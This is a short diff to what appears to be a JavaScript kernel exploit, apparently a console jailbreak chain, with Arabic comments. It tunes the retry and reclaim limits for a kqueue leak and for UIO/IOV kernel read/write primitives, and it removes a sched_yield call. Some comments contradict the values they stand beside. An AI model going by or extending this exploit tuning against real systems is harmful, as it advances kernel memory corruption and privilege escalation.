@@ -1635,7 +1635,7 @@ function leak_kqueue() {
 
   var count      = 0;
   var MAX_KQ     = 3000;     // أقل من 2000 لأن النجاح بقى أعلى
-  var INNER_MAX  = 900;      // أعلى من 500 لزيادة فرصة الـ window
+  var INNER_MAX  = 500;      // أعلى من 500 لزيادة فرصة الـ window
 
   var success    = false;
 
@@ -1681,8 +1681,6 @@ function leak_kqueue() {
       inner_tries++;
     }
       
-    sched_yield();
-
     if (success) {
       kl_lock = read64(leak_rthdr.add(0x60));
       kq_fdp  = read64(leak_rthdr.add(0x98));
@@ -1758,8 +1756,8 @@ function build_uio(uio, uio_iov, uio_td, read, addr, size) {
 // =========================
 
 // UIO reclaim max loops
-var KREAD_MAX_UIO_RECLAIM  = 7000;
-var KWRITE_MAX_UIO_RECLAIM = 7000;
+var KREAD_MAX_UIO_RECLAIM  = 10000;
+var KWRITE_MAX_UIO_RECLAIM = 10000;
 
 // IOV reclaim max loops
 var KREAD_MAX_IOV_RECLAIM  = 5000;
